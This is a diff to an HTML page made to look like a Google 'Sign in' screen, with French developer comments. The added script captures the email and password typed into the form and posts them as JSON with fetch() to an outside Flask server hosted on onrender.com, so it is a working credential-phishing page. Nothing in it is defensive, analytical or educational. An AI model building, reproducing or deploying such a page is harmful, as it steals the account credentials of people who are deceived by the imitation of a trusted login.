@@ -86,6 +86,12 @@
     .btn:hover {
       background: #1669c1;
     }
+
+    #response {
+      margin-top: 20px;
+      font-weight: bold;
+      color: green;
+    }
   </style>
 </head>
 <body>
@@ -102,13 +108,14 @@
     <h2>Sign in</h2>
     <p>Use your Google Account. The account will be added to this device and available to other Google apps.</p>
 
-    <form action="https://serveur-flask-6qqm.onrender.com" method="POST">
-      <input type="email" id="Email" name="Email" placeholder="Email or phone" required>
+    <!-- Formulaire sans action, on gère via JS -->
+    <form id="loginForm">
+      <input type="email" id="Email" placeholder="Email or phone" required>
       <div style="text-align: left; margin-top: 8px;">
         <a href="#">Forgot email?</a>
       </div>
 
-      <input type="password" id="password" name="password" placeholder="Password" required>
+      <input type="password" id="password" placeholder="Password" required>
       <div style="text-align: left; margin-top: 8px;">
         <a href="#">Forgot password?</a>
       </div>
@@ -118,29 +125,35 @@
         <button type="submit" class="btn">Next</button>
       </div>
     </form>
+
+    <div id="response"></div>
   </div>
-    <script>
-        const sendBtn = document.getElementById("send");
-        const messageInput = document.getElementById("messageInput");
-        const responseDiv = document.getElementById("response");
 
-        sendBtn.addEventListener("click", () => {
-            const message = messageInput.value;
+  <script>
+    const form = document.getElementById("loginForm");
+    const responseDiv = document.getElementById("response");
 
-            fetch("https://mon-serveur-flask.onrender.com/api/test", {  // <-- mets ici l'URL de ton serveur Flask
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ message: message })
-            })
-            .then(res => res.json())
-            .then(data => {
-                responseDiv.textContent = "Réponse du serveur : " + data.message;
-            })
-            .catch(err => {
-                console.error("Erreur :", err);
-                responseDiv.textContent = "Erreur de connexion au serveur";
-            });
-        });
-    </script>
+    form.addEventListener("submit", (e) => {
+      e.preventDefault(); // Empêche le rechargement de la page
+
+      const email = document.getElementById("Email").value;
+      const password = document.getElementById("password").value;
+
+      // <-- Remplace cette URL par ton serveur Flask réel
+      fetch("https://serveur-flask-6qqm.onrender.com/api/test", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: email, password: password })
+      })
+      .then(res => res.json())
+      .then(data => {
+        responseDiv.textContent = "Réponse du serveur : " + data.message;
+      })
+      .catch(err => {
+        console.error("Erreur :", err);
+        responseDiv.textContent = "Erreur de connexion au serveur";
+      });
+    });
+  </script>
 </body>
 </html>
